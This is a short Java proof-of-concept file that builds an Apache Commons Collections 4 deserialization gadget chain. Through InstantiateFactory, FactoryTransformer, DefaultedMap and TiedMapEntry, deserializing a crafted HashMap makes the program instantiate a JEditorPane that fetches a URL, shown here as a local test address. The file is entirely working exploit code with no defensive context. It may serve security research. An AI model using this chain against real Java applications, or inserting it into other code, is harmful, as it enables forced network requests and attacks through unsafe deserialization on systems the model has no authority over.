package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections4.functors.FactoryTransformer;
import org.apache.commons.collections4.functors.InstantiateFactory;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;

import javax.swing.*;
import java.util.HashMap;

public class POC_13 {

    public static void main(String[] args) throws Exception {
        InstantiateFactory factory = new InstantiateFactory<>(JEditorPane.class, new Class[]{String.class},new Object[]{"http://127.0.0.1:3000/test"});
        FactoryTransformer transformer = new FactoryTransformer<>(factory);

        DefaultedMap d = new DefaultedMap<>("1");
        TiedMapEntry t = new TiedMapEntry<>(d, "key");
        HashMap map = new HashMap<>();
        map.put(t, "value");

        ReflectionUtil.setField(d, "value", transformer);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
